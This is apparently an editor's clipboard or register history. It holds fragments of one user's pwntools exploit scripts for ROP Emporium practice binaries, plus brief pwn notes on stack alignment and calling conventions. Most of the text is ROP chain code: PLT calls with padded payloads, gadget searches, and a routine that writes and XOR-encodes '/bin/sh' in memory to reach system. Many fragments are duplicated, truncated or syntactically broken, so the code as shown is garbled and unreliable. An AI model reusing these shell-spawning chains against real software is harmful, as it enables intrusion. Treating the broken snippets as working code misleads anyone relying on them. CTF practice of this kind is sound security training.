6e20cb2fdb333519c65de0bd2800028c|file:///home/neo/ropemporium/callme32/exploit.py|50|1|V|python
	    OFFSET+4:p32(1)+p32(2)+p32(3),
3c6e2e68e44e1deed005d84feb4e2230|file:///home/neo/ropemporium/callme32/exploit.py|51|1|V|python
	    OFFSET+16:p32(CALL_ME_TWO_PLT),
041a5f12d4ccbc12e7165e4a37a2ce95|file:///home/neo/ropemporium/callme32/exploit.py|52|1|V|python
	    OFFSET+20:p32(1)+p32(2)+p32(3),
233741e768659c43594f0f094723e46a|file:///home/neo/ropemporium/callme32/exploit.py|54|14|v|python
	p32(1)+p32(2)+p32(3)
7e34fff72ca5815c2668f6b6b4885517|file:///home/neo/ropemporium/callme32/exploit.py|58|1|V|python
	payload = fit({OFFSET:p32(CALL_ME_ONE_PLT),
	    OFFSET+4:,
	    OFFSET+16:p32(CALL_ME_TWO_PLT),
	    OFFSET+20:p32(1)+p32(2)+p32(3),
	    OFFSET+32:p32(CALL_ME_THREE_PLT),
	    OFFSET+36:p32(1)+p32(2)+p32(3),
	    })
6d837a0a524e46a244d9c8175eed3c48|file:///home/neo/CTFs/notes/pwn.md|16|1|V|markdown
	rabin2 -qs <binary> | grep -ve imp -e ' 0 '
	
30c4e5a19f97af6b112d3591209b154c|file:///home/neo/ropemporium/callme32/exploit.py|7|1|V|python
	context.terminal = ['tmux', 'new-window']
27eef0700a940a7bda1d1b1701037034|file:///home/neo/ropemporium/callme32/exploit.py|51|1|V|python
	payload += p32(USEFUL_FUNC_ADDR)
90d2abdd2f7b3868d0429c6958088df7|file:///home/neo/ropemporium/callme32/exploit.py|52|1|V|python
	payload += "A"
9ef3243e8ef00b23d9d8af98705998e9|file:///home/neo/ropemporium/callme32/exploit.py|53|1|V|python
	payload += p32(CALL_ME_TWO_PLT)
30122dbf5f471466c66d790ef5c6608f|file:///home/neo/ropemporium/callme32/exploit.py|55|1|V|python
	payload += p32(CALL_ME_THREE_PLT)
6c833f6e9ecc3776b67ed11e7483ede9|file:///home/neo/ropemporium/callme32/exploit.py|54|1|V|python
	payload += p32(1)+p32(2)+p32(3)
06b2887d974decc4f99f92148baaf6e6|file:///home/neo/ropemporium/callme32/exploit.py|53|1|V|python
	payload += p32(0xaa)
20776ed6692789951285bfb351bc7206|file:///home/neo/ropemporium/callme32/exploit.py|55|1|V|python
	payload += p32(0xaa)+p32(1)+p32(2)+p32(3)
782c02e3a1b71d9868191bf22b61e058|file:///home/neo/ropemporium/callme32/exploit.py|44|1|V|python
	USEFUL_FUNC_ADDR = exe.sym.usefulFunction
03aeb07172900d9325e3adb04a6a5d4e|file:///home/neo/ropemporium/callme32/exploit.py|51|16|v|python
	CALL_ME_ONE_PLT
ada5087c3ce34cbb9298457b58e2ecd2|file:///home/neo/ropemporium/callme32/exploit.py|52|16|v|python
	CALL_ME_TWO_PLT
1bd190b6450b875d32086f920f5667c0|file:///home/neo/ropemporium/callme32/exploit.py|50|1|V|python
	payload_one = OFFSET * "A"
	payload_one += p32(CALL_ME_ONE_PLT)
	payload_one += p32(PWNME_ADDR)
	payload_one += p32(1)+p32(2)+p32(3)
00f8f0c09e218ca1299744832dab07fb|file:///home/neo/ropemporium/callme32/exploit.py|59|1|V|python
	
	io.sendline(payload_one)
e285a1f526716131b8b0bcd0a636d012|file:///home/neo/ropemporium/callme32/exploit.py|54|1|V|python
	io.sendline(payload_one)
db545489fd0c50a294f3105cd9431fc7|file:///home/neo/ropemporium/callme32/exploit.py|56|1|V|python
	payload_two = OFFSET * "A"
	payload_two += p32(CALL_ME_TWO_PLT)
	payload_two += p32(PWNME_ADDR)
	payload_two += p32(1)+p32(2)+p32(3)
	io.sendline(payload_two)
0853efbb53b4b141c706b715fef12148|file:///home/neo/CTFs/skeleton.py|47|32|v|python
	, filler="A"
1ac200e54972d525d880d8f77e456834|file:///home/neo/ropemporium/callme32/exploit.py|44|1|V|python
	PWNME_ADDR = exe.sym.pwnme
	CALL_ME_ONE_PLT = exe.plt.callme_one
	CALL_ME_TWO_PLT = exe.plt.callme_two
	CALL_ME_THREE_PLT = exe.plt.callme_three
389e93d071cbeef05c019dffe7c33e48|file:///home/neo/CTFs/notes/pwn.md|16|1|V|markdown
	rabin2 -qs <binary> | grep -ve imp -e ' 0 '
	
	- Disassemble (ghidra)
	
	- MOVAPS issue: when segfaulting on MOVAPS instructions on Ubuntu machines, we can either:
	    + Add one more `ret` before the last `ret`, or
	    + Jump further into the function in order to skip one push instruction
	Both of those techniques will keep the stack 16-byte aligned and won't crash the program
	
	- Calling convention for amd64:
	    + RDI, RSI, RDX, RCX, R8, and R9 for first 6 integer and memory address arguments
	    + XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 for floating point arguments
	    + R10 instead of RCX for syscalls
	    + Additional arguments are passed on the stack and the return value is stored in RAX.
	
83b9d2b30b99b13a827e2288445e17bb|file:///home/neo/ropemporium/callme/exploit.py|52|1|V|python
	payload = fit({OFFSET:"target"}, filler="A")
e7fc9668dfdff8c175603f9caa9d4e37|file:///home/neo/ropemporium/split/exploit.py|49|1|V|python
	POP_RDI_GADGET = rop.find_gadget(["pop rdi", "ret"]).address
	RET_GADGET = rop.find_gadget(["ret"]).address
a0f1baf928e72caadf43d218eb815690|file:///home/neo/ropemporium/callme/exploit.py|49|1|V|python
	POP_RDI_GADGET = rop.find_gadget(["pop rdi", "ret"]).address
4b61eb7300a3067972520c044cadf0cc|file:///home/neo/ropemporium/callme/exploit.py|50|1|V|python
	log.info("Pop rdi gadget: %#x" % POP_RDI_GADGET)
b8f99aee702ecc286c5c6f745edca2ad|file:///home/neo/ropemporium/callme/exploit.py|52|1|V|python
	log.info("Pop rsi gadget: %#x" % POP_RDI_GADGET)
308022411507d2729132b03385b72d54|file:///home/neo/ropemporium/callme/exploit.py|51|1|V|python
	log.info("Pop rdi gadget: %#x" % POP_RDI_GADGET)
	POP_RSI_GADGET = rop.find_gadget(["pop rsi", "ret"]).address
	log.info("Pop rsi gadget: %#x" % POP_RSI_GADGET)
	POP_RDX_GADGET = rop.find_gadget(["pop rdx", "ret"]).address
	log.info("Pop rdx gadget: %#x" % POP_RDX_GADGET)
ca49e4b0dee31581c8a190c2623203cd|file:///home/neo/ropemporium/callme/exploit.py|56|1|V|python
	payload_one = "A"*OFFSET
	payload_one += p64(POP_REGS_GADGET)
	payload_one += p64(1) + p64(2) + p64(3)
	payload_one += p64(PWNME_ADDR)
	io.sendline(payload_one)
5bc9b5b214be6e0d3ef89f526eedffd0|file:///home/neo/ropemporium/callme/exploit.py|59|1|V|python
	payload_one += p64(PWNME_ADDR)
05a3839b28dba7bafa986a7c394d347b|file:///home/neo/ropemporium/callme/exploit.py|59|1|V|python
	payload_one += p64(CALL_ME_ONE_PLT)
2a78100699eb334a8b93b5d996729b7f|file:///home/neo/ropemporium/callme/exploit.py|74|1|V|python
	payload_three += p64(RET_GADGET)
031f33ec45e826295da0c5157b795391|file:///home/neo/ropemporium/write432/exploit.py|49|1|V|python
	payload = fit({OFFSET:"target"})
68a62a4930836425d9f8c05dafda42ef|file:///home/neo/ropemporium/write432/exploit.py|46|15|v|python
	rop.find_gadget(["mov dword ptr [edi], ebp", "ret"]).address
2d6b6b4c7796cc07a71688f1d96f5b3c|file:///home/neo/ropemporium/write432/exploit.py|51|1|V|python
	payload += p32(MOV_EDI_EBP)
2a0fee7ef1fb017f9e4cae1d15303f33|file:///home/neo/ropemporium/write432/exploit.py|51|16|v|python
	MOV_EDI_EBP
0b26ac23e030ff20131aa9822a4c0ec2|file:///home/neo/ropemporium/write432/exploit.py|52|1|V|python
	payload += p32(0xaaaaaaaa)
3dbe00a167653a1aaee01d93e77e730e|file:///home/neo/ropemporium/write432/exploit.py|53|18|v|python
	aaaaaaaa
f301a477167cc429848290099835895a|file:///home/neo/ropemporium/write432/exploit.py|47|1|V|python
	POP_EDI_EBP = rop.find_gadgets(["pop edi", "pop ebp", "ret"]).address
4e2e3e76a4b1bbece94e0cb5bd6944fe|file:///home/neo/ropemporium/write432/exploit.py|48|15|v|python
	rop.find_gadgets(["pop edi", "pop ebp", "ret"]).address
016d05805ef983a11ea8a022dd41924e|file:///home/neo/ropemporium/write432/exploit.py|54|16|v|python
	0xaaaaaaaa
f70715a693ea5aed64679c6dd726b971|file:///home/neo/ropemporium/write432/exploit.py|55|12|v|python
	p32(0xbbbbbbbb)
364ac4d78a10c5e285a26d69c6d3c412|file:///home/neo/ropemporium/write432/exploit.py|49|14|v|python
	0x08048673
4177d83645fa23ef74ed50ac2c45e0a6|file:///home/neo/ropemporium/write432/exploit.py|42|5|V|python
	    piebase main
7500779be1e7e55c653d9bfd316fc798|file:///home/neo/ropemporium/write432/exploit.py|37|5|V|python
	    ''')
	    # pie breakpoint function+118
027ccf737391fc73f9a4fe0f062f08b1|file:///home/neo/ropemporium/write432/exploit.py|38|5|V|python
	    # pie breakpoint function+118
ec52395b7d36700d7d3b98acfa825379|file:///home/neo/ropemporium/write432/exploit.py|37|21|v|python
	unction+118
cb61e48bfc0d13030a8de59ee424954a|file:///home/neo/ropemporium/write432/exploit.py|55|1|V|python
	payload += "/bin"
518eff58361c709cc0c43534d642c176|file:///home/neo/ropemporium/write432/exploit.py|54|1|V|python
	# payload += p32(POP_EDI_EBP)
	# payload += p32(WRITE_ADDR)
	# payload += p32(MOV_EDI_EBP)
57afa44c28d51d55ec9dbcc52222cd99|file:///home/neo/ropemporium/write432/exploit.py|48|1|V|python
	BINSH_ADDR = 0xff88b5b0
52431e30bff6c7d84e53cf3b1ea3aec5|file:///home/neo/ropemporium/write432/exploit.py|54|1|V|python
	payload = "nib/"
	payload += "\x00hs/"
35e568ba1005d160b7060b089112dd65|file:///home/neo/ropemporium/write432/exploit.py|57|1|V|python
	payload += p32(BINSH_ADDR)
8069daf409b3cc900054d3bd13fcb696|file:///home/neo/ropemporium/write432/exploit.py|53|1|V|python
	# payload = "/bin/sh\x00"
d0b2ec25d70da440abad27c1c67db7ba|file:///home/neo/ropemporium/write432/exploit.py|56|1|V|python
	payload += p32(0xbbbbbbbb)
810247419084c82d03809fc886fedaad|file:///home/neo/ropemporium/write432/exploit.py|56|18|v|python
	bbbbbbbb
54f51040e91d35f14a21a6c7508666af|file:///home/neo/ropemporium/write432/exploit.py|56|1|V|python
	payload += p32(0x)
3589092e329f4bd30391aa1d2699799b|file:///home/neo/ropemporium/write432/exploit.py|47|1|v|python
	  [20] 
149a1d3a69d3b3835f1e2185f04e276e|file:///home/neo/ropemporium/write432/exploit.py|48|1|v|python
	  [21] 
54ca9ccf6a43e4bc09fd97543eba3ac9|file:///home/neo/ropemporium/write432/exploit.py|49|1|v|python
	  [22] 
cddf34f89e285481f7abea6b7507987b|file:///home/neo/ropemporium/write432/exploit.py|50|1|v|python
	  [23] 
7454c3d19135c9c7d79bad36c85b44d8|file:///home/neo/ropemporium/write432/exploit.py|51|1|v|python
	  [24] 
4f7baee0b4328f7ebcf6099e06931ba0|file:///home/neo/ropemporium/write432/exploit.py|52|1|v|python
	  [25] 
585535adab69fa8927111329cd8d7807|file:///home/neo/ropemporium/write432/exploit.py|53|1|v|python
	  [26] 
0d022225536f10c035c3837f63cf57df|file:///home/neo/ropemporium/write432/exploit.py|46|12|v|python
	       INIT_ARRAY      
44f6d8d7eb7ee5097a41cce070750033|file:///home/neo/ropemporium/write432/exploit.py|47|12|v|python
	       FINI_ARRAY      
fb542fed6740a8cadf11fc9fcbbeb700|file:///home/neo/ropemporium/write432/exploit.py|48|13|v|python
	      PROGBITS        
590a988a1de241677d1c60e58d093486|file:///home/neo/ropemporium/write432/exploit.py|49|13|v|python
	      DYNAMIC         
2f8885ffcac8fd0c81057fb193715bed|file:///home/neo/ropemporium/write432/exploit.py|53|13|v|python
	      NOBITS          
83741f2bde6b36c013d73ebb5c22323b|file:///home/neo/ropemporium/write432/exploit.py|46|22|v|python
	000f08 000004 00  WA  0   0  4
da1e258d1e4c6b9444644cb06a834e96|file:///home/neo/ropemporium/write432/exploit.py|47|21|v|python
	 000f0c 000004 00  WA  0   0  4
b17619eb3c636fdc050898b2c060008d|file:///home/neo/ropemporium/write432/exploit.py|48|21|v|python
	 000f10 000004 00  WA  0   0  4
7a0cb3550083ca6dea22f1beaa8544d6|file:///home/neo/ropemporium/write432/exploit.py|49|21|v|python
	 000f14 0000e8 08  WA  6   0  4
9f82bb6372374008710c69ed6dfa00b9|file:///home/neo/ropemporium/write432/exploit.py|50|21|v|python
	 000ffc 000004 04  WA  0   0  4
5819b4bc636e1ef6c58afe863a98f989|file:///home/neo/ropemporium/write432/exploit.py|51|21|v|python
	 001000 000028 04  WA  0   0  4
e23ef03ee4881dcd3cda96d60c6f5fdb|file:///home/neo/ropemporium/write432/exploit.py|52|22|v|python
	001028 000008 00  WA  0   0  4
b555de3b49a052cfe40e97792a2a6e92|file:///home/neo/ropemporium/write432/exploit.py|53|21|v|python
	 001030 00002c 00  WA  0   0 32
224587d21934c998f2418e374c40368d|file:///home/neo/ropemporium/write432/exploit.py|60|14|v|python
	exe.sym.usefulGadgets+3
ccd4b30bfb251c5a60d211ac7e7fa0ec|file:///home/neo/ropemporium/write432/exploit.py|66|1|V|python
	payload +=p32(0xbbbbbbbb)
7133c4ffd05268746363c81904e7b776|file:///home/neo/ropemporium/write432/exploit.py|65|1|V|python
	payload += p32(WRITE_ADDR)
129ff95ab01147eb6b977e9e8206fed2|file:///home/neo/ropemporium/write432/exploit.py|64|1|V|python
	payload += p32(POP_EDI_EBP)
0889028648fc89e9884c9bb0a28fc678|file:///home/neo/ropemporium/write432/exploit.py|62|1|V|python
	# POP_EDI_EBP = rop.find_gadgets(["pop edi", "pop ebp", "ret"]).address
c6fde0478e8002290b14719ed625e556|file:///home/neo/ropemporium/write432/exploit.py|59|1|V|python
	rop = ROP(exe)
23aac6e102bbeab37ab4bc7aa4304f5e|file:///home/neo/ropemporium/write432/exploit.py|59|1|V|python
	MOV_EDI_EBP = exe.sym.usefulGadgets
	SYSTEM_ADDR = exe.sym.system
	POP_EDI_EBP = 0x080486da 
390544c6b007ce139b070666c2182cbc|file:///home/neo/ropemporium/write432/exploit.py|67|1|V|python
	payload += p32(POP_EDI_EBP)
	payload += p32(WRITE_ADDR)
	payload += "/bin"
	payload += p32(MOV_EDI_EBP)
175f98124b05d0bb65cd7203ad845b93|file:///home/neo/ropemporium/write432/exploit.py|35|8|v|python
	str_len
73014226569275ac8d6d693ccf5f268b|file:///home/neo/ropemporium/write432/exploit.py|34|5|V|python
	    str_len = len(string)
05f557c2144a8def1161367eec2d3152|file:///home/neo/ropemporium/write432/exploit.py|39|18|v|python
	"/bin"
77d34896b2679692a726d97aee414603|file:///home/neo/ropemporium/write432/exploit.py|32|5|V|python
	    SYSTEM_ADDR = exe.sym.system
158e7da423170babc6716fc7d11fb250|file:///home/neo/ropemporium/write432/exploit.py|75|1|V|python
	
	# payload += p32(POP_EDI_EBP)
	# payload += p32(WRITE_ADDR+4)
	# payload += "/sh\x00"
	# payload += p32(MOV_EDI_EBP)
	
d12fbc9a2ba3b0b91a4190959b4c966b|file:///home/neo/ropemporium/write432/exploit.py|30|3|v|python
	Align
33f25ae6831fd44a08e78d501b90d8f0|file:///home/neo/ropemporium/write432/exploit.py|76|1|V|python
	# payload += write(WRITE_ADDR, "/bin/sh\x00")
1b96f45c7845e69e54da38b6ee98ff46|file:///home/neo/ropemporium/write432/exploit.py|37|9|V|python
	        string = string + "\x00"*(4 - str_len % 4)
ae9edf92a95e66a6aa1df0d599a7c2ac|file:///home/neo/CTFs/skeleton.py|47|10|v|python
	 fit({OFFSET:"target"})
dfd4ac38cc70e7ad1702896d1a28cd88|file:///home/neo/ropemporium/write4/exploit.py|47|15|v|python
	0x0000000000400890
369647d6268b2c7041ee1febe3a50ecb|file:///home/neo/ropemporium/write4/exploit.py|63|53|v|python
	with mov 
76ada4ffa38d9b1f75438063597ad640|file:///home/neo/ropemporium/badchars32/exploit.py|44|1|V|python
	    # piebase 0x7f0
	
	# io.sendline(cyclic(1024))
9b8d0c49ee1176bd1ac861531131dca6|file:///home/neo/ropemporium/badchars32/exploit.py|35|1|V|python
	WRITE_ADDR = 0x0804a038 # .data
a914b6aaad784d686a1b8f1841ad1751|file:///home/neo/ropemporium/write432/exploit.py|32|1|V|python
	def write(write_addr, string):
	    MOV_EDI_EBP = exe.sym.usefulGadgets
	    POP_EDI_EBP = 0x080486da 
	    chain = ""
	    if len(string) % 4 != 0:
	        string = string + "\x00"*(4 - len(string) % 4)
	    for i in range(0, len(string), 4):
	        chain += p32(POP_EDI_EBP)
	        chain += p32(WRITE_ADDR+i)
	        chain += string[i:i+4] 
	        chain += p32(MOV_EDI_EBP)
	    return chain
2d73b32baf348c43fd63d3d174a2cfa7|file:///home/neo/ropemporium/badchars32/exploit.py|59|1|V|python
	MOV_EDI_ESI = 0x08048893
f09833ab9298e21ce182f7a8849b01ab|file:///home/neo/ropemporium/badchars32/exploit.py|60|1|V|python
	MOV_EDI_ESI = 0x08048893
	POP_ESI_EDI = 0x08048899
36fc07f53a71943219445e098d30a3de|file:///home/neo/ropemporium/badchars32/exploit.py|31|1|V|python
	    MOV_EDI_EBP = exe.sym.usefulGadgets
	    POP_EDI_EBP = 0x080486da 
42831275a36cc32f71de03022d7d477d|file:///home/neo/ropemporium/badchars32/exploit.py|37|9|V|python
	        chain += string[i:i+4] 
1e80cb7e0fbfc9f5c0509a465ecdf6cf|file:///home/neo/ropemporium/badchars32/exploit.py|65|31|v|python
	/bin
36542a317606347474ea5354f97db816|file:///home/neo/ropemporium/badchars32/exploit.py|60|1|V|python
	XOR_EBX_CL = 0x08048890
684ebdce549af27fd966d9bed48b46c3|file:///home/neo/ropemporium/badchars32/exploit.py|71|30|v|python
	"aaaaaaa\x00"
8a3176add0ce694b7275b42b48a16849|file:///home/neo/ropemporium/badchars32/exploit.py|67|1|v|python
	TRING
74c53426398ccd5fbbad9ccb7b1de433|file:///home/neo/ropemporium/badchars32/exploit.py|68|1|v|python
	STRIN
63b588d5559f64f89a416e656880b949|file:///home/neo/ropemporium/badchars32/exploit.py|73|30|v|python
	STRING
3827ae5c91eedbc69a7e2f61cad817c7|file:///home/neo/ropemporium/badchars32/exploit.py|44|13|V|python
	            chain += p32(POP_EBX)
26e5dfa988619fc60c3c5527b3435337|file:///home/neo/ropemporium/badchars32/exploit.py|44|9|V|python
	        for j in range(4):
668b53a1fd96cd119df4a80f07a84a6a|file:///home/neo/ropemporium/badchars32/exploit.py|44|1|V|python
	        chain += p32(POP_EBX)
	        chain += p32(WRITE_ADDR+i)
	        chain += p32(XOR_EBX_CL)
009244de6dc704788669ff16e2191730|file:///home/neo/ropemporium/badchars32/exploit.py|51|9|V|python
	        chain += p32(POP_EBX)
f6a2f3f29edc7504fa48b166636b8f69|file:///home/neo/ropemporium/badchars32/exploit.py|48|1|V|python
	        chain += p32(POP_EBX)
	        chain += p32(WRITE_ADDR+i+1)
	        chain += p32(XOR_EBX_CL)
163bfce709a8ccb61af9d6cb6eb6105a|file:///home/neo/ropemporium/badchars32/exploit.py|57|35|V|python
	        chain += p32(WRITE_ADDR+i+3)
	        chain += p32(XOR_EBX_CL)
602cb5fe21394f76378ab710776f9e22|file:///home/neo/ropemporium/badchars32/exploit.py|58|9|V|python
	        chain += p32(XOR_EBX_CL)
49913ded12f1b76c5f7050baf8ae1b12|file:///home/neo/ropemporium/badchars32/exploit.py|44|1|V|python
	        if string[i] == '\x00':
	            break
5d793fc5b00a2348c3fb9ab59e5ca98a|file:///home/neo/ropemporium/badchars32/exploit.py|90|11|v|python
	aaaaaaa
af3ae6d3f0210276beea3535aa87db3e|file:///home/neo/ropemporium/badchars32/exploit.py|91|52|V|python
	string = ''.join(chr(ord(c) ^ 0x01) for c in string)
	log.info("XORed string: %s" % string)
7f4723b075e933bbf6cc9e28d838dc8d|file:///home/neo/ropemporium/badchars32/exploit.py|34|5|V|python
	    POP_ECX
f4e2ea55ae405344ef7ea600f78f9560|file:///home/neo/ropemporium/badchars32/exploit.py|35|5|V|python
	    log.info("XORed string: %s" % string)
bc4d3a0e342ae1c9311453fe7a68e02f|file:///home/neo/ropemporium/badchars32/exploit.py|45|14|V|python
	        if string[i] == '\x00':
	            break
	        chain += p32(POP_EBX)
	        chain += p32(WRITE_ADDR+i)
	        chain += p32(XOR_EBX_CL)
	
	        if string[i+1] == '\x00':
	            break
	        chain += p32(POP_EBX)
	        chain += p32(WRITE_ADDR+i+1)
	        chain += p32(XOR_EBX_CL)
	
	        if string[i+2] == '\x00':
	            break
	        chain += p32(POP_EBX)
	        chain += p32(WRITE_ADDR+i+2)
	        chain += p32(XOR_EBX_CL)
	        
	        if string[i+3] == '\x00':
	            break
	        chain += p32(POP_EBX)
	        chain += p32(WRITE_ADDR+i+3)
	        chain += p32(XOR_EBX_CL)
5c4d1b6a98749e24da636ab7cf9579a0|file:///home/neo/ropemporium/badchars32/exploit.py|41|13|V|python
	            target_str = string[i:i+4]
d22720754777a6888b6edbfe64a0a441|file:///home/neo/ropemporium/badchars32/exploit.py|44|9|V|python
	        # chain += string[i:i+4] 
4679d00cdcff10cff51c14ba1afba7b6|file:///home/neo/ropemporium/badchars32/exploit.py|44|18|v|python
	"aaaa"
ffd50e7b1a5fb835b3a1079a3a5ef026|file:///home/neo/ropemporium/badchars32/exploit.py|46|1|V|python
	              char_xor = ord(char_ok) ^ ord(target_str[j])
2090cf6c4a82e56085b4023288438fff|file:///home/neo/ropemporium/badchars32/exploit.py|51|15|V|python
	              xor_str
3fb4dd8a8a4c902c297e70fd9f661132|file:///home/neo/ropemporium/badchars32/exploit.py|56|1|V|python
	        log.info("Input str: %d" % input_str)
324118a6721dd6b8a9b9f4e327df2bf5|file:///home/neo/ropemporium/badchars32/exploit.py|57|19|v|python
	Input
335565eff3aa0dff69e58b0711cf4db1|file:///home/neo/ropemporium/badchars32/exploit.py|57|34|v|python
	inpt_str
51ea725f68bd275b3b1206147bbc877a|file:///home/neo/ropemporium/badchars32/exploit.py|46|15|V|python
	              print(char_ok)
8f3dd6dc60e7e568937ef792c4331242|file:///home/neo/ropemporium/badchars32/exploit.py|47|15|V|python
	              print(char_xor)
7e9cf38cd4d1812567e56eecba66c69b|file:///home/neo/ropemporium/badchars32/exploit.py|54|16|V|python
	               lof
862e53e47080de9929ad74269e54a360|file:///home/neo/ropemporium/badchars32/exploit.py|29|5|V|python
	    print(badchars)
6bf67bb70553dbbb883632f796c0f04a|file:///home/neo/ropemporium/badchars32/exploit.py|30|9|V|python
	        log.info("Badchars i: %d" % badchars)
1503a6d5053b2938b6a8060fc5fb14c3|file:///home/neo/ropemporium/badchars32/exploit.py|30|37|v|python
	badchars
5ac9fecb24850af044da201da3b43d72|file:///home/neo/ropemporium/badchars32/exploit.py|29|22|V|python
	    for i in badchars:
	        log.info("Badchars i: %s" % i)
f19132b3ce9cd98096d28dd0925a72b8|file:///home/neo/ropemporium/badchars32/exploit.py|50|21|V|python
	                    log.info()
9e72ad8049f0da4a1d58f5046ebe0703|file:///home/neo/ropemporium/badchars32/exploit.py|46|17|V|python
	                log.info("Char ok: %s" % char_ok)
ee4e1c0940faaf110a7d6626e91940a9|file:///home/neo/ropemporium/badchars32/exploit.py|50|21|V|python
	                    log.info("Char ok: %s" % char_ok)
7d0bbf294162d380cd27e681d3db18bb|file:///home/neo/ropemporium/badchars32/exploit.py|53|17|V|python
	                log.info("target j: %s" % target_str[j])
1a1b684df4610026d00d9e1e77103d8b|file:///home/neo/ropemporium/badchars32/exploit.py|56|9|V|python
	        test = ''.join(chr(ord(c) ^))
71891f1eda414708fb40f2d8dbe7d0f1|file:///home/neo/ropemporium/badchars32/exploit.py|60|26|V|python
	        # log.info("Input str: %s" % input_str)
	        # log.info("XOR str: %s" % xor_str)
dc311ea49d125198d752f731d7ea6ef1|file:///home/neo/ropemporium/badchars32/exploit.py|67|22|v|python
	0x61616150
7635e1085005ae483271d7b794e887c8|file:///home/neo/ropemporium/badchars32/exploit.py|67|34|V|python
	        first_xor = xor_str[0] * 4
	        log.info("First xor %s", first_xor)
b31c7f1cde74fa90b28bd5ff5fedeaa5|file:///home/neo/ropemporium/badchars32/exploit.py|68|1|V|python
	        chain += xor_str[0] * 4
62c8da3bba62a0b5d6f82d8d0ccda08b|file:///home/neo/ropemporium/badchars32/exploit.py|67|9|V|python
	        # chain += p32(0x10101010)
6d17803fc53a20923d5b62612be40b3d|file:///home/neo/ropemporium/badchars32/exploit.py|113|14|v|python
	0x0804a038
9fbc5df7b55460d5b9b594df86049c7f|file:///home/neo/ropemporium/badchars32/exploit.py|70|9|V|python
	        
	        # if string[i] == '\x00':
	        #     break
	        # chain += p32(POP_EBX)
	        # chain += p32(WRITE_ADDR+i)
	        # chain += p32(XOR_EBX_CL)
	
	        # if string[i+1] == '\x00':
	        #     break
	        # chain += p32(POP_EBX)
	        # chain += p32(WRITE_ADDR+i+1)
	        # chain += p32(XOR_EBX_CL)
	
	        # if string[i+2] == '\x00':
	        #     break
	        # chain += p32(POP_EBX)
	        # chain += p32(WRITE_ADDR+i+2)
	        # chain += p32(XOR_EBX_CL)
	        
	        # if string[i+3] == '\x00':
	        #     break
	        # chain += p32(POP_EBX)
	        # chain += p32(WRITE_ADDR+i+3)
	        # chain += p32(XOR_EBX_CL)
d06e8fb32f76d571e8dd3788c3cec236|file:///home/neo/ropemporium/badchars32/exploit.py|60|1|V|python
	        log.info("Xor str: %s", xor_str)
b2a3def4991c38dacb4c516613f50f5e|file:///home/neo/ropemporium/badchars32/exploit.py|60|35|v|python
	xor_str
8d2db65b538b12ed06bf82f7c36b4501|file:///home/neo/ropemporium/badchars32/exploit.py|69|13|V|python
	            log.info("%d" % j)
ec246b0b201fbadf888818ddaa060f24|file:///home/neo/ropemporium/badchars32/exploit.py|61|13|V|python
	        log.info("Input str: %s", input_str)
	        # log.info("Xor str: %s", xor_str)
601a40da58a63fe413460447984ca0bb|file:///home/neo/ropemporium/badchars32/exploit.py|57|1|V|python
	        # test = ""
	        # for j in range(4):
	        #     test += chr(ord(input_str[j]) ^ ord(xor_str[j]))
	        # log.info("Test: %s" % test)
a685d02823d91d7243a2d25d34090d19|file:///home/neo/ropemporium/badchars32/exploit.py|52|9|V|python
	                # log.info("Char xor: %d" % ord(char_xor))
ae718cce80ebb391b219ca2e0efd4cf3|file:///home/neo/ropemporium/badchars32/exploit.py|34|5|V|python
	    # string = ''.join(chr(ord(c) ^ 0x01) for c in string)
912f47d48b42b0f4ca0b76f8c8a97458|file:///home/neo/ropemporium/badchars32/exploit.py|28|1|V|python
	def write(write_addr, string, badchars):
	    MOV_EDI_ESI = 0x08048893
	    POP_ESI_EDI = 0x08048899
	    XOR_EBX_CL = 0x08048890
	    rop = ROP(exe)
	    POP_EBX_ECX = rop.find_gadget(["pop ebx", "pop ecx", "ret"]).address
	    string = string + "\x00"
	    chain = ""
	    # Pad string to make it a multiple of 4
	    if len(string) % 4 != 0:
	        string = string + "\x00"*(4 - len(string) % 4)
	    # Check the characters we want to write. If the string contains a character in badchars, find an allowed character and xor them
	    # Store both characters. We will write the first, then xor it with the second so we get back the desired char
	    # If the initial character is allowed, write it as is and xor it with 0
	    # There was probably a simpler way to do this
	    for i in range(0, len(string), 4):
	        target_str = string[i:i+4]
	        input_str = ""
	        xor_str = ""
	        for j in range(4):
	            if target_str[j] in badchars:
	                char_ok = badchars[0] 
	                char_xor = ord(char_ok) ^ ord(target_str[j])
	                while char_ok in badchars or char_xor in badchars:
	                    char_ok = chr(ord(char_ok) + 1)
	                    char_xor = chr(ord(char_ok) ^ ord(target_str[j]))
	                input_str += char_ok   
	                xor_str += char_xor
	            else:
	                input_str += target_str[j] 
	                xor_str += '\x00'
	
a48ad43406b557c0ebc0f619c42a7da4|file:///home/neo/ropemporium/badchars32/exploit.py|28|1|V|python
	def write(write_addr, string, badchars):
	    MOV_EDI_ESI = 0x08048893
	    POP_ESI_EDI = 0x08048899
	    XOR_EBX_CL = 0x08048890
	    rop = ROP(exe)
	    POP_EBX_ECX = rop.find_gadget(["pop ebx", "pop ecx", "ret"]).address
	    string = string + "\x00"
	    chain = ""
	    # Pad string to make it a multiple of 4
	    if len(string) % 4 != 0:
	        string = string + "\x00"*(4 - len(string) % 4)
	    # Check the characters we want to write. If the string contains a character in badchars, find an allowed character and xor them
	    # Store both characters. We will write the first, then xor it with the second so we get back the desired char
	    # If the initial character is allowed, write it as is and xor it with 0
	    # There was probably a simpler way to do this
	    for i in range(0, len(string), 4):
	        target_str = string[i:i+4]
	        input_str = ""
	        xor_str = ""
	        for j in range(4):
	            if target_str[j] in badchars:
	                char_ok = badchars[0] 
	                char_xor = ord(char_ok) ^ ord(target_str[j])
	                while char_ok in badchars or char_xor in badchars:
	                    char_ok = chr(ord(char_ok) + 1)
	                    char_xor = chr(ord(char_ok) ^ ord(target_str[j]))
	                input_str += char_ok   
	                xor_str += char_xor
	            else:
	                input_str += target_str[j] 
	                xor_str += '\x00'
	
	        # Write the string with the allowed characters
	        chain += p32(POP_ESI_EDI)
	        chain += input_str
	        chain += p32(WRITE_ADDR+i)
	        chain += p32(MOV_EDI_ESI)
	
	        # Xor each char to get the desired char
	        # Pop ecx to change cl
	        for j in range(4):
	            chain += p32(POP_EBX_ECX)
	            chain += p32(WRITE_ADDR+i+j)
	            chain += xor_str[j] * 4
	            chain += p32(XOR_EBX_CL)
	
	    return chain
14829b8e6aa88d41e3becd17edbacbed|file:///home/neo/ropemporium/badchars/exploit.py|30|28|V|python
	    POP_ESI_EDI = 0x08048899
	    XOR_EBX_CL = 0x08048890
94633d038a71aff8dc1e54ffecbd45fb|file:///home/neo/ropemporium/badchars/exploit.py|30|5|V|python
